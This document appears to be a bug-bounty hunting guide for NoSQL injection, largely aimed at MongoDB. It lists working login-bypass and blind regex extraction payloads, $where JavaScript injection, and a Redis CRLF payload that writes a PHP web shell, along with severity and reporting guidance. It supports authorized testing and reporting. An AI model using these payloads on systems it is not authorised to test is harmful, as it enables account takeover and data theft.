# NoSQL Injection — Hunting Methodology

## What Is NoSQL Injection

Unlike SQL injection which targets relational databases, NoSQL injection targets document stores (MongoDB), key-value stores (Redis), and graph databases. The attack patterns differ significantly — instead of `' OR 1=1`, attackers inject **operator objects** or **JavaScript** into query parameters.

Most common target: **MongoDB** in Node.js/Express apps.

---

## MongoDB Operator Injection

### How It Happens

Vulnerable Node.js/Express code:
```javascript
// Vulnerable — user input directly merged into query
const user = await User.findOne({ email: req.body.email, password: req.body.password });

// If attacker sends: {"email": "admin@target.com", "password": {"$gt": ""}}
// MongoDB query becomes: {email: "admin@target.com", password: {$gt: ""}}
// $gt: "" means "password greater than empty string" → matches ANY password!
```

### Detection Payloads

**In JSON body** — replace string value with operator object:
```json
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "invalid"}}
{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$gt": ""}}
```

**In URL query parameters** (bracket notation):
```
/login?user=admin&password[$gt]=
/search?query[$regex]=.*&query[$options]=i
/api/users?role[$ne]=user
```

**If the app parses URL params as objects** (qs library with default settings):
```
/login?username=admin&password[$gt]=&password[$lt]=zzz
```

---

## Auth Bypass via `$ne` / `$gt`

**Most impactful single payload — bypasses login without knowing the password:**

```json
POST /api/login
Content-Type: application/json

{"email": "admin@target.com", "password": {"$ne": "x"}}
```

If response returns a valid session token → **authentication bypass = Critical.**

Variations:
```json
{"email": {"$gt": ""}, "password": {"$gt": ""}}   // Login as first user in DB
{"email": "admin@target.com", "password": {"$exists": false}}  // Password field doesn't need to exist
{"email": {"$regex": ".*admin.*"}, "password": {"$gt": ""}}    // Regex username match
```

---

## Data Extraction via `$regex`

Even without auth bypass, `$regex` allows blind data extraction similar to blind SQLi:

**Step 1 — Confirm regex injection:**
```json
{"username": {"$regex": "^a"}}  // Does this return different results for admin vs non-admin?
```

**Step 2 — Extract data character by character (suggest to user to script this):**
```json
{"username": {"$regex": "^a"}}  → if true, first char is 'a'
{"username": {"$regex": "^ad"}} → confirm second char
{"username": {"$regex": "^adm"}} → continue...
```

**Step 3 — Extract all usernames:**
```json
{"username": {"$regex": ".*"}, "password": {"$gt": ""}}  // Returns all users
```

---

## JavaScript Injection (Server-Side JS Execution)

Older MongoDB (< 4.4) supported `$where` with JavaScript expressions. If still in use:

```json
{"$where": "this.username == 'admin' && sleep(5000)"}
```

If the request takes 5+ seconds → **blind NoSQL injection via `$where` confirmed.**

**Data extraction via `$where`:**
```json
{"$where": "this.password.match(/^p/)"}  // True if password starts with 'p'
```

**RCE attempt (MongoDB < 2.4 / very old):**
```json
{"$where": "function() { return db.version(); }"}
```

> Modern MongoDB (4.x+) disables `$where` by default. Still worth testing legacy apps.

---

## Redis Injection

If application uses Redis for session/cache and incorporates user input into Redis commands:

**CRLF injection into Redis commands:**
```
user=test\r\nCONFIG SET dir /var/www/html\r\nCONFIG SET dbfilename shell.php\r\nSET x "<?php system($_GET['c']); ?>"\r\nBGSAVE
```

This is largely theoretical unless the app blindly concatenates user input into raw Redis protocol. Look for apps that use Redis as a message queue with user-controlled channel names or keys.

---

## GraphQL + NoSQL Injection

If app uses MongoDB behind a GraphQL API, operator injection may work through GraphQL arguments:

```graphql
{
  user(filter: "{\"password\": {\"$gt\": \"\"}}") {
    email
    apiKey
  }
}
```

Or if input is parsed as a filter object directly:
```graphql
{
  users(where: {password: {_gt: ""}}) {
    email
  }
}
```

---

## Identifying MongoDB/NoSQL Apps

**Signs the app uses MongoDB:**
- Stack traces mentioning `MongoError`, `mongoose`, `mongodb`
- Error messages: `CastError`, `ValidationError`, `ObjectId`
- ObjectId-style IDs in responses: `"id": "507f1f77bcf86cd799439011"` (24 hex chars)
- `_id` field in JSON responses
- `package.json` (if accessible) showing `mongoose` or `mongodb` dependencies
- JS files mentioning `.find({`, `.findOne({`, `.aggregate(`

---

## Bypassing Input Validation

Many apps use JSON Schema validation but only validate types at top level:

```json
// Validation expects: {"password": "string"}
// But some validators allow objects if union types not specified
{"password": {"$gt": ""}}
```

Try both:
1. Direct operator in JSON body
2. `Content-Type: application/x-www-form-urlencoded` with `password[$gt]=`
3. Mixed — some fields as strings, target field as operator

---

## Impact Classification

| Scenario | Severity |
|---|---|
| Auth bypass via `$ne`/`$gt` on login | Critical |
| Data extraction via `$regex` (any user data) | High |
| Auth bypass → admin panel access | Critical |
| `$where` JavaScript injection confirmed | High/Critical |
| Operator injection with limited data exposure | Medium |
| Injection in search (no auth bypass, no sensitive data) | Low/Medium |

## Evidence Requirements
1. Exact payload injected (JSON body or URL params)
2. Response showing successful auth bypass OR extracted data
3. Comparison: normal request vs injected request
4. For blind extraction: show the binary search process output

## Do Not Report
- NoSQL injection attempts that return the same response as a normal request (not vulnerable)
- Injection in pure read-only endpoints with no sensitive data returned
- Operator injection filtered by input validation (show attempted bypass first)
